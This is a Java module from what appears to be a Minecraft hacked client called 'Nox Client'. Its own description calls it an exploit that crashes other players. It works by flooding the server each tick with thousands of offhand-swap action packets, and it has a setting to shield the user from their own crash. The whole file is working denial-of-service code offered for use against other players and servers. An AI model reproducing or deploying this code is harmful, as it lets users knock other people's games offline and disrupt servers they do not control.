/*
 * This file is part of the Nox Client.
 * Made by Niix#8237
 */

package com.noxclient.systems.modules.player;

import com.noxclient.mixin.ClientConnectionAccessor;
import com.noxclient.settings.BoolSetting;
import com.noxclient.settings.IntSetting;
import com.noxclient.settings.Setting;
import com.noxclient.settings.SettingGroup;
import io.netty.channel.Channel;
import com.noxclient.events.world.TickEvent;
import com.noxclient.systems.modules.Categories;
import com.noxclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("do-crash")
            .description("Sends X number of offhand swap sound packets to the server per tick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Integer> speed = sgGeneral.add(new IntSetting.Builder()
            .name("speed")
            .description("The amount of swaps measured in ticks.")
            .defaultValue(2000)
            .min(1)
            .sliderRange(1, 10000)
            .visible(doCrash::get)
            .build()
    );

    private final Setting<Boolean> antiCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("anti-crash")
            .description("Attempts to prevent you from crashing yourself.")
            .defaultValue(true)
            .build()
    );

    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (doCrash.get()) {
            Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
            for (int i = 0; i < speed.get(); ++i) channel.write(PACKET);
            channel.flush();
        }
    }

    public boolean isAntiCrash() {
        return isActive() && antiCrash.get();
    }
}
